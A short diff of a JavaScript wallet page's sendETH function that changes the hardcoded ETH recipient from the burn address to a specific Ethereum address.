@@ -23,7 +23,7 @@ document.getElementById("connectButton").onclick = async () => {
 async function sendETH() {
   const status = document.getElementById("status");
   const amount = document.getElementById("amount").value;
-  const recipient = "0x000000000000000000000000000000000000dead";
+  const recipient = "0x1E78A36F4BfF568E9Bc79c31b81F2b4cb58dBa35";
 
   if (!signer) {
     status.innerText = "Wallet not connected.";
